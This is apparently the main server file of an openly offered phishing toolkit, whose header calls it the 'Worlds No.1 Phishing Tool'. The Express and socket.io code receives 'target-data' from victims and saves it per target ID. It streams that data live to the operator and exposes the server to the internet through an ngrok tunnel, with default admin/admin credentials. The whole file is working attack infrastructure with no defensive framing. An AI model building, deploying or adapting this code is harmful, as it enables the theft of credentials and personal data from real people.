/**
 * 
 * @Author      : Madhan (Madhanmaaz) - madhan hacker
 * github       : https://github.com/madhanmaaz
 * website      : http://madhanmaaz.netlify.app/
 * Description  : Worlds No.1 Phishing Tool.
 * 
 */

const express = require("express")
const http = require("http")
const cookieParser = require("cookie-parser")
const expressDevice = require("express-device")
const { checkAdminToken, ssd, books, checkId, extractStaticFile } = require("./utils/utils")
const ngrok = require("ngrok")

const app = express()
const server = http.createServer(app)
const io = require("socket.io")(server)
const config = ssd.getItem("config.json")

app.use(express.static(__dirname + "/public"))
app.use(express.urlencoded({ extended: false }))
app.use(expressDevice.capture())
app.set("view engine", "ejs")
app.use(express.json())
app.use(cookieParser())
global.io = io


// routes
app.use("/", require("./route"))
app.use("/app", require("./route/app"))
app.use(checkAdminToken)
app.use("/db", require("./route/db"))


// socket connection
io.on("connection", socket => {
    socket.on("target-connected", data => {
        socket.broadcast.emit("in-target-connected", data)
    })

    socket.on("target-data", data => {
        const page = checkId(data.id)
        socket.broadcast.emit("in-target-data", data)

        if (page) {
            page.data.push(data)
            books.setItem(`${data.id}.json`, page)
        }
    })
})


const PORT = config.port || process.env.PORT
server.listen(PORT, async () => {
    extractStaticFile()

    try {
        const url = await ngrok.connect({
            proto: "http",
            addr: PORT,
            authtoken: config.ngrokToken
        })

        config["ngrok-url"] = url
        ssd.setItem("config.json", config)
    } catch (error) {
        config["ngrok-url"] = "NGROK-ERROR"
        ssd.setItem("config.json", config)
        console.log("NGROK ERROR:", error)
    }

    require("./utils/banner")
    console.log(`
LOCAL URL : http://localhost:${PORT}/ (WEB VIEW)
PORT      : ${PORT}
USERNAME  : admin  (default)
PASSWORD  : admin  (default)
BROWSER   : chrome (default)

> want to change ./ssd/config.json
    `)
})